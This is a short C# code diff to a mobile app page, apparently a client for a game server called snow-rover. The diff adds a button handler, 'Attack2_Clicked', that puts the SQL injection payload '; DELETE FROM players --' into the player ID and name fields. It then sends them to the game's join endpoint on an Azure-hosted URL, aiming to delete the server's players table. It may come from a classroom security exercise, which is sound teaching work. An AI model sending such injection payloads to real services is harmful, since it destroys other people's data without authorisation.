@@ -219,7 +219,7 @@ public partial class MainPage : ContentPage
        
 
     }
-
+    
 
     public class StatusResult
     {
@@ -237,6 +237,12 @@ public partial class MainPage : ContentPage
         public string Orientation { get; set; }
     }
 
-   
+    private async void Attack2_Clicked(object sender, EventArgs e)
+    {
+        var playerID = "; DELETE FROM players --";
+        var playerName = "; DELETE FROM players --";
+        HttpClient httpClient = new HttpClient { BaseAddress = new Uri("https://snow-rover.azurewebsites.net") };
+        var response = await httpClient.GetAsync($"/game/join?gameId={gameID}&name={playerName}&id={playerID}");
+    }
 }
 
